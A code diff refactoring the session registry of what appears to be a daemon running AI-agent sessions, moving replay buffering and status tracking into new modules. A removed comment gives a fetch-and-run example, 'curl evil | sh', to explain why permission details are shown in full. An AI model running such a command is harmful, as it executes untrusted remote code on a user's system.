@@ -13,7 +13,6 @@ import {
   type AgentSession,
   type Backend,
 } from "../adapters";
-import { PERMISSION_TIMEOUT_MS } from "../adapters/types";
 import { allowedOverRelay, relayGateRefusal, type CredentialKind } from "../provider-policy";
 import type { BangProc } from "../pty/pty";
 import { createLogger, scrub, verbose } from "../log";
@@ -24,15 +23,15 @@ import { recoverStoredTranscript } from "./session-recovery";
 import { SessionCheckpointStore, type StoredSession } from "./session-store";
 import { normalizePromptOptions } from "../prompt-options";
 
-import { BUFFER_CAP, BUFFER_MAX_BYTES } from "./limits";
+import { ReplayRing } from "./replay-ring";
+import {
+  IDLE_STATE,
+  reduceSessionState,
+  type SessionActivityState,
+  type SessionStateInput,
+} from "./session-state";
 
-/** Rough retained size of a buffered message. JSON length is the honest proxy
- *  for the payloads that matter here (a data: URI is one long string) and
- *  costs one serialization per broadcast — the same work the verbose logger
- *  already does per message. */
-function msgBytes(msg: WireMsg): number {
-  return Buffer.byteLength(JSON.stringify(msg));
-}
+export { foldUsage } from "./session-state";
 
 // A session with no viewports keeps a warm engine this long. With the
 // production checkpoint store it then unloads to a dormant resumable record;
@@ -53,15 +52,6 @@ export const PROMPT_GATE_REFUSAL =
 // stream. 0 disables merging — every delta passes straight through
 // synchronously; tests inject their own window via the constructor.
 const DELTA_COALESCE_MS = envInt("DELTA_COALESCE_MS", 33);
-// Cap on the fleet's pending-permission MIRROR (2026-07-24 audit): a flooded
-// session — a hostile or steered model spamming permissioned tool calls —
-// must not grow watcher snapshots without bound (500 asks × full detail ≈
-// 1MB to every watcher, up to 10×/s). Oldest evict first: they're closest
-// to the adapter's auto-deny, and an evicted ask stays answerable at the
-// adapter — only the fleet's view of it is dropped; in-session viewports
-// saw its permission_request regardless. Each KEPT entry still carries its
-// full, untruncated detail (the earlier 2026-07-24 audit's rule).
-const PERMISSION_MIRROR_CAP = 25;
 // Ceiling on concurrent sessions: a runaway or hostile local client can't
 // exhaust memory + PTYs by creating without bound. Generous — a human working
 // across projects won't approach it; create() throws past it (the caller turns
@@ -138,7 +128,7 @@ export function expandHomePath(cwd: string, home = os.homedir()): string {
   return cwd.replace(/^~(?=[\\/]|$)/, home);
 }
 
-export type SessionEntry = {
+export type SessionEntry = SessionActivityState & {
   id: string;
   cwd: string;
   // Where the next `!` command runs. `cd` in a bang persists here, confined
@@ -164,10 +154,9 @@ export type SessionEntry = {
   backend: Backend;
   session: AgentSession;
   promptOptions: PromptOption[];
-  buffer: WireMsg[];
-  /** Running sum of `msgBytes` over `buffer` — kept incrementally so the byte
-   *  cap costs one serialization per broadcast, not a walk of the whole ring. */
-  bufferBytes: number;
+  /** The sequenced replay ring plus the delta-coalescing window that feeds
+   *  it; delivers into `deliver()` in exact stream order. */
+  ring: ReplayRing;
   viewports: Set<Viewport>;
   // The subset of `viewports` that are REMOTE (relay) — the ones the R.4i
   // relay gate governs. Tracked so a mid-session credential-kind flip to a
@@ -175,74 +164,28 @@ export type SessionEntry = {
   // same posture the attach gate takes for a fresh remote attach (audit
   // 2026-08-13). Always a subset of `viewports`.
   remoteViewports: Set<Viewport>;
-  // Next session-scoped sequence number; broadcast stamps it onto every
-  // message so a reconnecting viewport can name where its stream broke off (4.4).
-  nextSeq: number;
-  /** A tail cursor is meaningful only inside one daemon's stream epoch. A
-   *  checkpoint can lag already-fanned high-volume frames by the debounce
-   *  window, so a session reopened from disk must full-replay for this engine
-   *  lifetime instead of comparing a prior daemon's cursor to reused seqs. */
-  tailResumeSafe: boolean;
-  // 4.6 fleet metadata: display name (defaults to the cwd leaf, renamable),
-  // coarse activity state derived from the broadcast stream, and when the
-  // stream last moved.
+  // Fleet metadata: display name (defaults to the cwd leaf, renamable) and
+  // when the stream last moved. The stream-derived state (status, turn
+  // counters, activity, pending asks, usage) is the SessionActivityState
+  // this type extends — session-state.ts owns the rule.
   name: string;
-  status: SessionMeta["status"];
   lastActivity: number;
   idleTimer?: NodeJS.Timeout;
   // The one running `!` command, if any (one at a time per session,
-  // like a terminal). The proc itself never leaves the server (4.9).
+  // like a terminal). The proc itself never leaves the server.
   bang?: { id: string; proc: BangProc };
   // When the last `!` command started — the burst throttle in connection.ts
   // (each bang costs a model turn, so bursts burn tokens).
   lastBangAt?: number;
-  // Enqueued + running model turns, independent from the composite fleet
-  // status: a permission hold or a `!` PTY can temporarily own `status` while
-  // model work remains underneath. Never persisted — recovery starts idle.
-  modelTurnsPending: number;
-  // Adapters emit error + turn_end for one failed turn. The error provides
-  // immediate terminal feedback; this marker keeps its following turn_end
-  // from decrementing the pending count a second time.
-  errorAwaitingTurnEnd?: boolean;
-  // The live-tree doorbell (W.1): running exactly while viewports are
-  // attached — first attach starts it, last detach (and end) stops it — so a
-  // dormant session holds no inotify watches.
+  // The live-tree doorbell: running exactly while viewports are attached —
+  // first attach starts it, last detach (and end) stops it — so a dormant
+  // session holds no inotify watches.
   fsWatch?: FsWatchHandle;
-  // Phase M cockpit metadata (M.1), derived in broadcast() the same way
-  // `status` is: when the session was created (the cockpit's stable sort
-  // key), what it's doing right now, the pending-permission queue (each
-  // entry lives until ITS OWN resolution — see captureCockpit), and folded
-  // session usage. `askedAt` mirrors the adapter's auto-deny deadline and
-  // stays server-side (summary() strips it off the wire).
+  // When the session was created — the cockpit's stable sort key.
   createdAt: number;
-  activity?: { label: string; since: number };
-  permissions: { id: string; tool: string; detail: string; askedAt: number }[];
-  usage?: { inputTokens: number; outputTokens: number; costUsd?: number };
-  // The open delta-coalescing window (DELTA_COALESCE_MS): consecutive
-  // same-type deltas accumulate here until the timer — or any other
-  // message — flushes them as one WireMsg.
-  pendingDelta?: Extract<WireMsg, { type: "text_delta" | "thinking_delta" }>;
-  deltaTimer?: NodeJS.Timeout;
   checkpointTimer?: NodeJS.Timeout;
 };
 
-/**
- * Fold one per-turn `usage` report into the session total — the status bar's
- * exact rule (T2.6, Shell.tsx): tokens are per-turn and SUM; costUsd arrives
- * session-cumulative and is TAKEN, never summed (a later report without a
- * cost keeps the last one). Exported for the Tier-1 pin.
- */
-export function foldUsage(
-  prev: SessionEntry["usage"],
-  msg: { inputTokens: number; outputTokens: number; costUsd?: number },
-): NonNullable<SessionEntry["usage"]> {
-  const costUsd = msg.costUsd ?? prev?.costUsd;
-  return {
-    inputTokens: (prev?.inputTokens ?? 0) + msg.inputTokens,
-    outputTokens: (prev?.outputTokens ?? 0) + msg.outputTokens,
-    ...(costUsd !== undefined ? { costUsd } : {}),
-  };
-}
 
 /**
  * Sessions decoupled from connections (Step 4.2). A session outlives any
@@ -304,6 +247,7 @@ export class SessionRegistry {
     // (Phase P.1). Falls back to the mock when the agent has no credentials.
     const session: AgentSession = this.makeSession(backend, { cwd: dir });
     const entry: SessionEntry = {
+      ...IDLE_STATE,
       id,
       cwd: dir,
       bangCwd: dir,
@@ -313,18 +257,15 @@ export class SessionRegistry {
       backend,
       session,
       promptOptions: [],
-      buffer: [],
-      bufferBytes: 0,
+      ring: new ReplayRing({
+        coalesceMs: this.deltaCoalesceMs,
+        deliver: (msg) => this.deliver(entry, msg),
+      }),
       viewports: new Set(),
       remoteViewports: new Set(),
-      nextSeq: 1,
-      tailResumeSafe: true,
       name: path.basename(dir) || dir,
-      status: "idle",
-      modelTurnsPending: 0,
       lastActivity: Date.now(),
       createdAt: Date.now(),
-      permissions: [],
     };
     return this.activate(entry);
   }
@@ -354,6 +295,7 @@ export class SessionRegistry {
     const { buffer, nextSeq } = recoverStoredTranscript(stored);
     const bangCwd = this.restoredBangCwd(cwd, stored.bangCwd);
     const entry: SessionEntry = {
+      ...IDLE_STATE,
       id: stored.id,
       cwd,
       bangCwd,
@@ -363,21 +305,17 @@ export class SessionRegistry {
       backend: restoredBackend,
       session,
       promptOptions: normalizePromptOptions(stored.promptOptions).map((option) => ({ ...option })),
-      buffer,
-      bufferBytes: buffer.reduce((sum, msg) => sum + msgBytes(msg), 0),
+      ring: ReplayRing.restore(buffer, nextSeq, {
+        coalesceMs: this.deltaCoalesceMs,
+        deliver: (msg) => this.deliver(entry, msg),
+      }),
       viewports: new Set(),
       remoteViewports: new Set(),
-      nextSeq,
-      tailResumeSafe: false,
       name: stored.name,
-      status: "idle",
-      modelTurnsPending: 0,
       lastActivity: stored.lastActivity,
       createdAt: stored.createdAt,
-      permissions: [],
       ...(stored.usage ? { usage: { ...stored.usage } } : {}),
     };
-    this.trimBuffer(entry);
     return this.activate(entry);
   }
 
@@ -443,8 +381,8 @@ export class SessionRegistry {
       backend: { ...entry.backend },
       ...(entry.session.resumeId ? { resumeId: entry.session.resumeId } : {}),
       promptOptions: entry.promptOptions,
-      buffer: entry.buffer,
-      nextSeq: entry.nextSeq,
+      buffer: entry.ring.buffer,
+      nextSeq: entry.ring.nextSeq,
       name: entry.name,
       status: entry.status,
       lastActivity: entry.lastActivity,
@@ -519,40 +457,7 @@ export class SessionRegistry {
       this.fanout(entry, msg);
       return;
     }
-    if (
-      this.deltaCoalesceMs > 0 &&
-      (msg.type === "text_delta" || msg.type === "thinking_delta")
-    ) {
-      const pending = entry.pendingDelta;
-      // The merge key is (type, parentId) — SA.2: with parallel subagents
-      // streaming, merging on type alone would concatenate one agent's prose
-      // into another's (or into the parent's) inside a single message.
-      if (pending && pending.type === msg.type && pending.parentId === msg.parentId) {
-        pending.text += msg.text;
-        return;
-      }
-      this.flushDeltas(entry);
-      entry.pendingDelta = {
-        type: msg.type,
-        text: msg.text,
-        ...(msg.parentId !== undefined ? { parentId: msg.parentId } : {}),
-      };
-      entry.deltaTimer = setTimeout(() => this.flushDeltas(entry), this.deltaCoalesceMs);
-      entry.deltaTimer.unref();
-      return;
-    }
-    this.flushDeltas(entry);
-    this.deliver(entry, msg);
-  }
-
-  /** Deliver whatever delta text the open window holds, in stream position. */
-  private flushDeltas(entry: SessionEntry) {
-    clearTimeout(entry.deltaTimer);
-    entry.deltaTimer = undefined;
-    const pending = entry.pendingDelta;
-    if (!pending) return;
-    entry.pendingDelta = undefined;
-    this.deliver(entry, pending);
+    entry.ring.offer(msg);
   }
 
   private deliver(entry: SessionEntry, msg: WireMsg) {
@@ -579,165 +484,35 @@ export class SessionRegistry {
       const body = JSON.stringify(msg);
       log.debug(`${msg.type} ${body.length > 300 ? body.slice(0, 300) + "…" : body}`);
     }
-    // Resume cursor, one stamp for all viewports. Stamped on a shallow copy,
-    // so the adapter's own object never carries a seq and re-emitting it can't
-    // corrupt an already-buffered seq. The copy is shallow: nested objects
-    // (render props, tool input) stay shared with the adapter, which must not
-    // mutate a message after emitting it.
-    msg = { ...msg, seq: entry.nextSeq++ };
-    entry.buffer.push(msg);
-    entry.bufferBytes += msgBytes(msg);
-    this.trimBuffer(entry);
+    msg = entry.ring.push(msg);
     entry.lastActivity = Date.now();
-    // Coarse fleet status, derived from the stream itself — no adapter
-    // cooperation needed. Terminal states first; a permission hold sticks
-    // until the turn moves again (4.6).
-    const prev = entry.status;
-    if (msg.type === "turn_end" || msg.type === "error") {
-      if (msg.type === "error") {
-        if (!entry.errorAwaitingTurnEnd) {
-          entry.modelTurnsPending = Math.max(0, entry.modelTurnsPending - 1);
-        }
-        entry.errorAwaitingTurnEnd = true;
-      } else if (entry.errorAwaitingTurnEnd) {
-        entry.errorAwaitingTurnEnd = false;
-      } else {
-        entry.modelTurnsPending = Math.max(0, entry.modelTurnsPending - 1);
-      }
-        entry.status = entry.modelTurnsPending > 0 ? "working" : "idle";
-    } else if (msg.type === "bang_end") {
-      // The `!` PTY is its own lifecycle running BESIDE the model turn — its
-      // end is NOT the turn reaching a terminal state. Treating it as one
-      // wiped the pending-permission mirror (the fleet row lost its
-      // allow/deny while the ask was still live at the adapter — the
-      // 2026-07-24 bug class through a different door) and re-opened the
-      // mid-turn burst gate (2026-07-29 bughunt).
-      entry.status = entry.permissions.length
-        ? "permission"
-        : entry.modelTurnsPending > 0
-          ? "working"
-          : "idle";
-    } else if (msg.type === "permission_request") {
-      entry.status = "permission";
-    } else if (msg.type === "bang_start" || msg.type === "bang_output") {
-      // Bang traffic is not the turn moving: it must not lift a permission
-      // hold (the row keeps sorting needs-you-first while the ask pends).
-      if (entry.status !== "permission") entry.status = "working";
-    } else if (msg.type !== "permission_resolved") {
-      // permission_resolved decides its own status in captureCockpit — it
-      // must not blanket-flip to "working" while a SECOND ask still pends.
-      entry.status = "working";
-    }
-    const cockpitChanged = this.captureCockpit(entry, msg) || entry.status !== prev;
+    const watchersChanged = this.applyState(entry, { kind: "message", msg });
     // Semantic boundaries write their atomic checkpoint synchronously before
     // the browser can observe the frame. In particular, `turn_end` must not
     // reach a viewport while the complete record is still only a .tmp file:
     // an immediate daemon death in that window would acknowledge a finished
     // turn and reopen the previous partial checkpoint on restart.
     this.scheduleCheckpoint(entry, msg);
-    if (cockpitChanged) this.notifyWatchers();
+    if (watchersChanged) this.notifyWatchers();
     this.fanout(entry, msg);
+  }
+
+  /** Run the stream-state reducer and adopt its result; returns whether
+   *  fleet-visible metadata changed. */
+  private applyState(entry: SessionEntry, input: SessionStateInput): boolean {
+    const { state, watchersChanged } = reduceSessionState(entry, input);
+    entry.status = state.status;
+    entry.modelTurnsPending = state.modelTurnsPending;
+    entry.errorAwaitingTurnEnd = state.errorAwaitingTurnEnd;
+    entry.activity = state.activity;
+    entry.permissions = state.permissions;
+    entry.usage = state.usage;
+    return watchersChanged;
   }
 
   /** Send one message to every attached viewport — fan-out only, no buffering. */
   private fanout(entry: SessionEntry, msg: WireMsg) {
     for (const viewport of entry.viewports) viewport(msg);
-  }
-
-  /** Evict oldest-first until the ring is under both caps. */
-  private trimBuffer(entry: SessionEntry) {
-    if (entry.buffer.length > BUFFER_CAP) {
-      for (const dropped of entry.buffer.splice(0, entry.buffer.length - BUFFER_CAP)) {
-        entry.bufferBytes -= msgBytes(dropped);
-      }
-    }
-    // Byte cap: drop oldest until under budget, but never the message just
-    // buffered — a single payload over the whole budget still replays (it is
-    // already bounded at its source, e.g. the image resolver's 2 MB cap).
-    while (entry.bufferBytes > BUFFER_MAX_BYTES && entry.buffer.length > 1) {
-      entry.bufferBytes -= msgBytes(entry.buffer.shift()!);
-    }
-  }
-
-  /**
-   * Cockpit metadata (M.1), derived off the same stream `status` is — runs
-   * AFTER the status derivation (the idle-clears read the new status).
-   * Returns true when watcher-visible metadata changed beyond the status
-   * flip itself.
-   */
-  private captureCockpit(entry: SessionEntry, msg: WireMsg): boolean {
-    const prevActivity = entry.activity?.label;
-    const prevPending = entry.permissions.length;
-    // Activity: what the session is doing right now — `since` resets only
-    // when the label CHANGES, so a re-announced identical status keeps its
-    // elapsed time. The in-session indicator persists through text
-    // streaming until turn_end (Shell's ActivityLine), so holding the last
-    // label here is faithful.
-    if (msg.type === "status") {
-      const label = msg.state === "tool" ? (msg.label ?? "tool") : "thinking";
-      if (prevActivity !== label) entry.activity = { label, since: Date.now() };
-    } else if (msg.type === "bang_start") {
-      // First line only, capped — a pasted script must not bloat snapshots.
-      entry.activity = {
-        label: `! ${msg.command.split("\n", 1)[0].slice(0, 80)}`,
-        since: Date.now(),
-      };
-    } else if (entry.status === "idle") {
-      entry.activity = undefined;
-    }
-    // Each pending permission lives until ITS OWN resolution: an answer
-    // (grid or in-session — both route through answerPermission), the
-    // adapter's auto-deny timeout (mirrored by askedAt below), or the turn
-    // reaching a terminal state. The stream merely MOVING must not clear the
-    // queue — with concurrent requests, the first answer's tool output used
-    // to wipe the still-pending rest off the fleet forever (the 2026-07-24
-    // bug; previously documented as a v1 honesty bound).
-    if (msg.type === "permission_request") {
-      // The FULL detail — never truncated. Grid allow/deny is a real
-      // approval decision, so the fleet approver must see exactly what the
-      // in-session bar shows; a capped detail could hide a dangerous tail
-      // (`…harmless… && curl evil | sh`) past a benign head (2026-07-24
-      // audit). The detail already reaches every viewport in the original
-      // permission_request; copying it whole here leaks nothing new.
-      entry.permissions.push({ id: msg.id, tool: msg.tool, detail: msg.detail, askedAt: Date.now() });
-      if (entry.permissions.length > PERMISSION_MIRROR_CAP) {
-        // At-cap eviction keeps the length constant, so the changed-metadata
-        // check below stays false and the notify storm is damped too — a
-        // flood past the cap stops fanning snapshots to watchers entirely.
-        entry.permissions = entry.permissions.slice(-PERMISSION_MIRROR_CAP);
-      }
-    } else if (msg.type === "permission_resolved") {
-      // The adapter's own resolution word (answer, timeout, interrupt) —
-      // exact where the clock-aging below is approximate. An answered id is
-      // usually already gone (answerPermission dropped it for instant fleet
-      // feedback); the timeout path is the one only this catches. The hold
-      // lifts once nothing is pending — never while a second ask still is.
-      entry.permissions = entry.permissions.filter((p) => p.id !== msg.id);
-      if (entry.status === "permission" && entry.permissions.length === 0) {
-        entry.status = "working";
-      }
-    } else if (msg.type === "turn_end" || msg.type === "error") {
-      // The turn that owned these asks ended. A queued next turn may keep the
-      // session working, but none of the prior turn's approvals survive into it.
-      entry.permissions = [];
-    } else if (entry.status === "idle") {
-      // bang_end only lands here when no ask pends — the status derivation
-      // keeps "permission" through a bang, so a live ask is never wiped by one.
-      entry.permissions = [];
-    } else if (entry.permissions.length) {
-      // The adapter auto-denies an unanswered ask at PERMISSION_TIMEOUT_MS
-      // with no stream event marking it — age the mirror out on the same
-      // clock so the row never advertises an ask that can no longer be
-      // answered. (A stale answer is a no-op at the adapter regardless.)
-      const cutoff = Date.now() - PERMISSION_TIMEOUT_MS;
-      entry.permissions = entry.permissions.filter((p) => p.askedAt > cutoff);
-    }
-    if (msg.type === "usage") entry.usage = foldUsage(entry.usage, msg);
-    return (
-      entry.activity?.label !== prevActivity ||
-      entry.permissions.length !== prevPending ||
-      msg.type === "usage"
-    );
   }
 
   /**
@@ -746,10 +521,7 @@ export class SessionRegistry {
    * from some other life (a seq we never issued) (4.4).
    */
   canResume(entry: SessionEntry, afterSeq: number): boolean {
-    if (!entry.tailResumeSafe) return false;
-    if (!Number.isInteger(afterSeq) || afterSeq < 0 || afterSeq >= entry.nextSeq) return false;
-    const firstBuffered = entry.buffer[0]?.seq ?? entry.nextSeq;
-    return afterSeq >= firstBuffered - 1;
+    return entry.ring.canResume(afterSeq);
   }
 
   /** Mark an attached viewport as REMOTE (relay) — connection.ts calls this
@@ -780,18 +552,7 @@ export class SessionRegistry {
    */
   attach(entry: SessionEntry, viewport: Viewport, afterSeq?: number) {
     clearTimeout(entry.idleTimer);
-    // The ring must be complete before it replays — an open delta window
-    // would otherwise hold the transcript's tail past the replay.
-    this.flushDeltas(entry);
-    for (const msg of entry.buffer) {
-      // Stamped on a copy at replay time (protocol.ts `replay`): the client
-      // paints history identically but suppresses live-only side effects
-      // (screen-reader announcements re-fired per historical turn on every
-      // reload — 2026-07-29 bughunt). The buffer itself stays unstamped.
-      if (afterSeq === undefined || (msg.seq ?? 0) > afterSeq) {
-        viewport({ ...msg, replay: true });
-      }
-    }
+    for (const msg of entry.ring.replayAfter(afterSeq)) viewport(msg);
     entry.viewports.add(viewport);
     if (entry.promptOptions.length) {
       viewport({ type: "prompt_options", options: entry.promptOptions });
@@ -849,7 +610,7 @@ export class SessionRegistry {
 
   /** Detaching never closes the session — the idle timer does, much later. */
   detach(entry: SessionEntry, viewport: Viewport) {
-    this.flushDeltas(entry); // the leaving viewport sees the stream's true tail
+    entry.ring.flush(); // the leaving viewport sees the stream's true tail
     entry.viewports.delete(viewport);
     entry.remoteViewports.delete(viewport);
     if (entry.viewports.size === 0) {
@@ -870,7 +631,7 @@ export class SessionRegistry {
     clearTimeout(entry.idleTimer);
     entry.idleTimer = setTimeout(() => {
       if (entry.viewports.size !== 0 || this.entries.get(entry.id) !== entry) return;
-      this.flushDeltas(entry);
+      entry.ring.flush();
       if (this.store) {
         const stored = this.checkpoint(entry);
         // Never trade a failed disk write for data loss. Keep the warm engine
@@ -920,7 +681,7 @@ export class SessionRegistry {
       this.notifyWatchers();
       return true;
     }
-    this.flushDeltas(entry); // pending stream text lands before session_ended
+    entry.ring.flush(); // pending stream text lands before session_ended
     // Delete the durable copy BEFORE dropping the live engine. If disk
     // refuses the explicit delete, the session remains usable and the caller
     // gets an error instead of being told it ended while it can reappear.
@@ -1030,9 +791,9 @@ export class SessionRegistry {
     const entry = this.entries.get(id);
     if (!entry) return false;
     entry.session.resolvePermission(permissionId, allow);
-    const before = entry.permissions.length;
-    entry.permissions = entry.permissions.filter((p) => p.id !== permissionId);
-    if (entry.permissions.length !== before) this.notifyWatchers();
+    if (this.applyState(entry, { kind: "permission_answered", id: permissionId })) {
+      this.notifyWatchers();
+    }
     return true;
   }
 
@@ -1068,8 +829,7 @@ export class SessionRegistry {
    */
   dispatchPrompt(entry: SessionEntry, text: string): boolean {
     if (entry.modelTurnsPending > 1) return false;
-    entry.modelTurnsPending += 1;
-    entry.errorAwaitingTurnEnd = false;
+    this.applyState(entry, { kind: "prompt_accepted" });
     this.broadcast(entry, { type: "user_prompt", text });
     entry.session.pushPrompt(text);
     return true;
@@ -1081,8 +841,7 @@ export class SessionRegistry {
    * slot just like typed input would. */
   markModelTurnStarted(entry: SessionEntry) {
     if (this.entries.get(entry.id) !== entry) return;
-    entry.modelTurnsPending += 1;
-    entry.errorAwaitingTurnEnd = false;
+    this.applyState(entry, { kind: "prompt_accepted" });
   }
 
   /** Push a fresh snapshot to every watcher, coalescing bursts. */
